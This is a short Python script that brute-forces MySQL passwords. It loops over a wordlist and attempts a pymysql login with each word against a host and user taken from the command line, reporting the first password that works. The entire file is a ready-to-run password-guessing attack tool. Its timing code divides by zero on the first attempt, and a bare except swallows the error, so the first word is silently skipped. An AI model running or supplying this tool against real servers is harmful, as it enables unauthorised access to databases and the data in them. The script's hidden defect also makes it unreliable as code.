import pymysql, sys, datetime, time
from threading import Thread

class Forcer:
    def __init__(self, host = "127.0.0.1", user = "root", wls = "wordlist.txt"):
        self.__host = host
        self.__user = user
        self.__wordlistname = wls
        self.TakeWordlist()
        #self.CalcTime()
        self.Attack()
    #def CalcTime(self, a = 11, iter = 16):
    #    return(((a*len(self.__wordlist))/iter)/60000)
    def ReturnSettings(self):
        return(self.__host, self.__user, self.__wordlist)
    def TakeWordlist(self):
        with open(self.__wordlistname) as wls:
            self.__wordlist = wls.read().split()
    def Attack(self):
        self.__startdate = datetime.datetime.now()
        self.__finishdate = 0
        print(f"-*- Attack Started -*-\nWords:{len(self.__wordlist)}")
        for i in range(len(self.__wordlist)):
            try:
                self.__finishdate = datetime.datetime.now()
                ort =+ (self.__finishdate.microsecond-self.__startdate.microsecond)/i
                #print("{}\t{}\t{}\t{}".format(i, self.__finishdate-self.__startdate, self.CalcTime(ort, i)*len(self.__wordlist), self.__wordlist[i]))
                print("{}\t{}\t{}".format(i, self.__finishdate-self.__startdate, self.__wordlist[i]))
                pymysql.connect(host=self.__host, user=self.__user, password=self.__wordlist[i])
            except:
                pass
            else:
                print(f"Found: {self.__wordlist[i]} [{self.__finishdate-self.__startdate}]")
                sys.exit(1)
                break
if __name__ == "__main__":
    f = Forcer(host = sys.argv[1], user = sys.argv[2], wls = sys.argv[3])